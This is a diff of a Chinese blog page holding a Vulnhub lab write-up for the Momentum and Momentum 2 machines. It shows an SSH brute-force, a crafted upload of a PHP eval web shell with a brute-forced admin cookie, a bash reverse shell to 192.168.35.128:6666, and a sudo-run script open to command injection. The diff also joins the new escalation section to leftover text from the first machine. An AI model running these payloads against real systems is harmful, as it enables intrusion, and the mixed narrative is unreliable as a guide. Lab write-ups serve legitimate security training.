@@ -38,7 +38,7 @@
     
       <meta 
         property="og:img" 
-        content="难度：⭐⭐⭐">
+        content="难度：⭐⭐⭐⭐">
     
     
       <meta 
@@ -49,7 +49,7 @@
         content="2022-05-27">
       <meta 
         property="og:article:modified_time" 
-        content="2022-06-13">
+        content="2022-07-21">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -57,7 +57,19 @@
         
           <meta 
             property="og:article:tag" 
+            content="文件上传">
+        
+          <meta 
+            property="og:article:tag" 
             content="Vulnhub">
+        
+          <meta 
+            property="og:article:tag" 
+            content="SSH端口转发">
+        
+          <meta 
+            property="og:article:tag" 
+            content="redis数据库">
         
       
     
@@ -325,7 +337,7 @@
     
     
       <span class="dot"></span>
-      <span>1.4k words</span>
+      <span>2k words</span>
     
   </div>
   
@@ -340,9 +352,36 @@
         
           
           <a 
+            href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+            class="post-meta-link">
+            文件上传
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
             href="/tags/Vulnhub/" 
             class="post-meta-link">
             Vulnhub
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+            class="post-meta-link">
+            SSH端口转发
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" 
+            class="post-meta-link">
+            redis数据库
           </a>
         
       </div>
@@ -427,49 +466,124 @@ Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linu
       <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Please select a file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
 
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>直接访问 <code>/ajax.php</code> 为空，在目录扫描中也能知道 /ajax.php 的 Size 为0。<br>访问 <code>/dashboard.html</code>，发现是一个能够上传文件的界面，界面提示<strong>Upload Your Research File about Owls</strong>。<br>访问 <code>/owls</code>，找到一个可疑图片<strong>/icons/blank.gif</strong>，保存下来到 /dashboard.html 上传，上传失败？？？<br>strings这张图片试试：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
-└─<span class="token comment"># strings index.gif     </span>
-GIF89a
-NThis art is <span class="token keyword">in</span> the public domain. Kevin Hughes, kevinh@eit.com, September <span class="token number">1995</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>使用 <code>nmap</code> 进行ssh爆破：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
-└─<span class="token comment"># nmap -p 22 --script ssh-brute --script-args userdb=db.txt,passdb=db.txt 192.168.81.134</span>
-Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-05-25 02:20 CDT
-NSE: <span class="token punctuation">[</span>ssh-brute<span class="token punctuation">]</span> Trying username/password pair: auxerre-alienum<span class="token comment">##:auxerre-alienum##</span>
-<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
-PORT   STATE SERVICE
-<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
-<span class="token operator">|</span> ssh-brute: 
-<span class="token operator">|</span>   Accounts: 
-<span class="token operator">|</span>     auxerre:auxerre-alienum<span class="token comment">## - Valid credentials</span>
-<span class="token operator">|</span>_  Statistics: Performed <span class="token number">43</span> guesses <span class="token keyword">in</span> <span class="token number">13</span> seconds, average tps: <span class="token number">3.3</span>
-MAC Address: 00:0C:29:3B:6D:A4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到ssh账号密码 <strong>auxerre:auxerre-alienum##</strong>，成功ssh登录，并在当前用户目录下找到flag：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
-└─<span class="token comment"># ssh 'auxerre'@'192.168.81.134'</span>
-<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
-auxerre@Momentum:~$ <span class="token function">id</span>
-<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>auxerre<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>auxerre<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>auxerre<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,111<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span>
-auxerre@Momentum:~$ <span class="token builtin class-name">pwd</span>
-/home/auxerre
-auxerre@Momentum:~$ <span class="token function">ls</span> -l
-total <span class="token number">4</span>
--rwx------ <span class="token number">1</span> auxerre auxerre <span class="token number">146</span> Apr <span class="token number">22</span>  <span class="token number">2021</span> user.txt
-auxerre@Momentum:~$ <span class="token function">cat</span> user.txt
-<span class="token punctuation">[</span> Momentum - User Owned <span class="token punctuation">]</span>
----------------------------------------
-flag <span class="token builtin class-name">:</span> 84157165c30ad34d18945b647ec7f647
----------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>直接访问 <code>/ajax.php</code> 为空，在目录扫描中也能知道 /ajax.php 的 Size 为0。<br>访问 <code>/dashboard.html</code>，发现是一个能够上传文件的界面，界面提示<strong>Upload Your Research File about Owls</strong>，上传的文件会在/Owls目录下。<br>扫目录的时候漏了一个<strong>ajax.php.bak</strong>文件，应该在 gobuster 文件类型上加上一个 php.bak（经测试，这里只加 bak 扫不出来）。<br>访问 <code>/ajax.php.bak</code> ：<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token comment">//The boss told me to add one more Upper Case letter at the end of the cookie //boss曾经曰过：需要在cookie后加上至少1位的大写字母</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'&amp;G6u@B6uDXMq&amp;Ms'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//如果Cookie参数admin值为&amp;G6u@B6uDXMq&amp;Ms</span>
+    <span class="token comment">//[+] Add if $_POST['secure'] == 'val1d' //如果参数secure值为val1d</span>
+     <span class="token variable">$valid_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pdf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//则允许上传pdf、php和txt类型的文件</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+
+     <span class="token variable">$valid_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// Remember success upload returns 1 //上传成功则返回1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>构造请求报文：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /ajax.php HTTP/1.1
+Host: <span class="token number">192.168</span>.35.129
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:100.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/100.0
+Accept: */*
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>---------------------------26669720613696613903927820022
+Content-Length: <span class="token number">371</span>
+Origin: http://192.168.35.129
+DNT: <span class="token number">1</span>
+Connection: close
+Referer: http://192.168.35.129/dashboard.html
+Cookie: <span class="token assign-left variable">admin</span><span class="token operator">=</span><span class="token operator">&amp;</span>G6u@B6uDXMq<span class="token operator">&amp;</span>Ms§A§ //增加Cookie参数admin，值为<span class="token operator">&amp;</span>G6u@B6uDXMq<span class="token operator">&amp;</span>Ms§A§，其中最后一位设置为payload，进行大写字母遍历
+
+-----------------------------26669720613696613903927820022  //增加POST请求form-data表单数据secure，值为val1d
+Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"secure"</span><span class="token punctuation">;</span>
+
+val1d
+-----------------------------26669720613696613903927820022
+Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"cmd.php"</span>
+Content-Type: application/x-php
+
+<span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+-----------------------------26669720613696613903927820022--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在bp-intruder中找到成功上传文件的末尾 <strong>R</strong>。<br>蚁剑连接 <code>/owls/cmd.php</code> ，密码cmd，成功getshell，在蚁剑里反弹shell至kali。<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/home<span class="token punctuation">)</span> $ <span class="token function">bash</span> -c <span class="token string">'bash -i >&amp; /dev/tcp/192.168.35.128/6666 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>看一下有什么好登西：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lnvp 6666         </span>
+Ncat: Version <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
+Ncat: Listening on :::6666
+Ncat: Listening on <span class="token number">0.0</span>.0.0:6666
+Ncat: Connection from <span class="token number">192.168</span>.35.129.
+Ncat: Connection from <span class="token number">192.168</span>.35.129:51964.
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">563</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+
+www-data@momentum2:/home$ <span class="token function">ls</span> -l
+<span class="token function">ls</span> -l
+total <span class="token number">8</span>
+drwxr-xr-x <span class="token number">3</span> athena athena <span class="token number">4096</span> May <span class="token number">27</span>  <span class="token number">2021</span> athena
+drwxr-xr-x <span class="token number">2</span> root   root   <span class="token number">4096</span> May <span class="token number">27</span>  <span class="token number">2021</span> team-tasks
+www-data@momentum2:/home$ <span class="token builtin class-name">cd</span> athena
+<span class="token builtin class-name">cd</span> athena
+www-data@momentum2:/home/athena$ <span class="token function">ls</span> -l
+<span class="token function">ls</span> -l
+total <span class="token number">8</span>
+-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">37</span> May <span class="token number">27</span>  <span class="token number">2021</span> password-reminder.txt
+-rw-r--r-- <span class="token number">1</span> root   root   <span class="token number">241</span> May <span class="token number">27</span>  <span class="token number">2021</span> user.txt
+www-data@momentum2:/home/athena$ <span class="token function">cat</span> user.txt //找到第一个flag
+<span class="token function">cat</span> user.txt
+/                         <span class="token punctuation">\</span>
+~ Momentum <span class="token number">2</span> ~ User Owned ~
+<span class="token punctuation">\</span>                         /
+
+---------------------------------------------------
+FLAG <span class="token builtin class-name">:</span> 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
+---------------------------------------------------
+www-data@momentum2:/home/athena$ <span class="token function">cat</span> password-reminder.txt //找到一个密码
+<span class="token function">cat</span> password-reminder.txt
+password <span class="token builtin class-name">:</span> myvulnerableapp<span class="token punctuation">[</span>Asterisk<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>搜索了一下 Asterisk = <em> ，用账号 athena 和密码  myvulnerableapp</em> 尝试登陆：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh 'athena'@'192.168.35.129'                                                  </span>
+athena@192.168.35.129<span class="token string">'s password: 
+Linux momentum2 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu May 27 18:12:57 2021 from 10.0.2.15
+
+athena@momentum2:~$ id
+uid=1000(athena) gid=1000(athena) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+athena@momentum2:/home/team-tasks$ ls -l
+total 8
+-rw-r--r-- 1 root root 402 May 27  2021 cookie-gen.py
+-rw-r--r-- 1 root root   0 May 27  2021 log.txt
+-rw-r--r-- 1 root root 151 May 27  2021 note.txt
+
+athena@momentum2:/home/team-tasks$ cat note.txt //用户 athena 具有文件 cookie-gen.py 的执行权限
+Hey, Athena use the cookie-gen.py 
+to generate secure cookies for our application 
+also remove the ajax.php.bak before it'</span>s too late.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
 <h2 id="3-_u63D0_u6743"><a href="#3-_u63D0_u6743" class="headerlink" title="3.提权"></a>3.提权</h2><blockquote>
-<p>查看系统用户表，看到存在用户 <code>redis</code> ：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">cat</span> /etc/passwd
-<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
-root:x:0:0:root:/root:/bin/bash
-auxerre:x:1000:1000:auxerre,,,:/home/auxerre:/bin/bash
-redis:x:107:115::/var/lib/redis:/usr/sbin/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>无法使用sudo提权，不具有<strong>/etc/passwd</strong>文件的写权限，<strong>cat crontab</strong>没有可利用的定时任务。<br>查看系统当前启用端口 <code>ss -tunlp</code>(这里尝试用<strong>netstat</strong>，系统提示没有这个命令)：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ ss -tunlp
-Netid        State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       
-udp          UNCONN        <span class="token number">0</span>             <span class="token number">0</span>                          <span class="token number">0.0</span>.0.0:68                      <span class="token number">0.0</span>.0.0:*          
-tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                        <span class="token number">0.0</span>.0.0:22                      <span class="token number">0.0</span>.0.0:*          
-tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                      <span class="token number">127.0</span>.0.1:6379                    <span class="token number">0.0</span>.0.0:*          
-tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                         <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*          
-tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                          <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:6379                       <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*          
-tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                              *:80                            *:*    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>发现系统当前启用了 <code>6379</code> 端口，查了一下是<strong>redis数据库</strong>的默认端口，结合之前发现的用户<code>redis</code>，这里猜测系统正在运行redis数据库，AUX查看当前系统进程确认：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">127.0</span>.0.1
+<p><strong>cookie-gen.py</strong> 的所属用户是 root ，而 athena 具有执行权限，尝试sudo提权：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ <span class="token function">sudo</span> -l
+Matching Defaults entries <span class="token keyword">for</span> athena on momentum2:
+   env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin
+
+User athena may run the following commands on momentum2:
+   <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>但 athena 不具有 cookie-gen.py 的写权限，无法直接写入反弹shell命令执行，看一下 cookie-gen.py 的内容：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ <span class="token function">cat</span> cookie-gen.py 
+<span class="token function">import</span> random
+<span class="token function">import</span> os
+<span class="token function">import</span> subprocess
+
+print<span class="token punctuation">(</span><span class="token string">'~ Random Cookie Generation ~'</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">'[!] for security reasons we keep logs about cookie seeds.'</span><span class="token punctuation">)</span>
+chars <span class="token operator">=</span> <span class="token string">'@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'</span>
+
+seed <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"Enter the seed : "</span><span class="token punctuation">)</span> // 传入参数 seed 的值
+random.seed <span class="token operator">=</span> seed
+
+cookie <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">c</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>:
+   cookie <span class="token operator">+=</span> random.choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span>
+
+print<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>
+
+cmd <span class="token operator">=</span> <span class="token string">"echo %s >> log.txt"</span> % seed
+subprocess.Popen<span class="token punctuation">(</span>cmd, <span class="token assign-left variable">shell</span><span class="token operator">=</span>True<span class="token punctuation">)</span> //<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>发现系统当前启用了 <code>6379</code> 端口，查了一下是<strong>redis数据库</strong>的默认端口，结合之前发现的用户<code>redis</code>，这里猜测系统正在运行redis数据库，AUX查看当前系统进程确认：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">127.0</span>.0.1
 redis      <span class="token number">540</span>  <span class="token number">0.1</span>  <span class="token number">0.4</span>  <span class="token number">51672</span>  <span class="token number">9568</span> ?        Ssl  03:20   <span class="token number">0</span>:06 /usr/bin/redis-server <span class="token number">127.0</span>.0.1:6379
 auxerre    <span class="token number">917</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">6208</span>   <span class="token number">824</span> pts/0    S+   04:23   <span class="token number">0</span>:00 <span class="token function">grep</span> <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><strong><em>（redis是非关系型数据库，数据是以键-值对的形式进行存储，没有传统的表）</em></strong><br>尝试本地登录redis，登录成功，查看所有的key，发现存在一个名称为<strong>rootpass</strong>的key，查看该key的值：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$  redis-cli //本地登录redis
 <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys * //查看所有key
@@ -598,7 +712,7 @@ udp        <span class="token number">0</span>      <span class="token number">0
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>49</span>
+    <span>50</span>
     <span>Tags</span>
   </a>
 </div>
@@ -720,6 +834,12 @@ udp        <span class="token number">0</span>      <span class="token number">0
       </a>
     
       <a 
+        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+        title="SSH端口转发">
+        <div class="tags-list-item">SSH端口转发</div>
+      </a>
+    
+      <a 
         href="/tags/Msfvenom/" 
         title="Msfvenom">
         <div class="tags-list-item">Msfvenom</div>
@@ -735,12 +855,6 @@ udp        <span class="token number">0</span>      <span class="token number">0
         href="/tags/DVWA/" 
         title="DVWA">
         <div class="tags-list-item">DVWA</div>
-      </a>
-    
-      <a 
-        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
-        title="SSH端口转发">
-        <div class="tags-list-item">SSH端口转发</div>
       </a>
     
       <a 
@@ -768,6 +882,18 @@ udp        <span class="token number">0</span>      <span class="token number">0
       </a>
     
       <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" 
+        title="redis数据库">
+        <div class="tags-list-item">redis数据库</div>
+      </a>
+    
+      <a 
         href="/tags/redis/" 
         title="redis">
         <div class="tags-list-item">redis</div>
@@ -777,18 +903,6 @@ udp        <span class="token number">0</span>      <span class="token number">0
         href="/tags/XSS/" 
         title="XSS">
         <div class="tags-list-item">XSS</div>
-      </a>
-    
-      <a 
-        href="/tags/AES/" 
-        title="AES">
-        <div class="tags-list-item">AES</div>
-      </a>
-    
-      <a 
-        href="/tags/Nacos/" 
-        title="Nacos">
-        <div class="tags-list-item">Nacos</div>
       </a>
     
   </div>
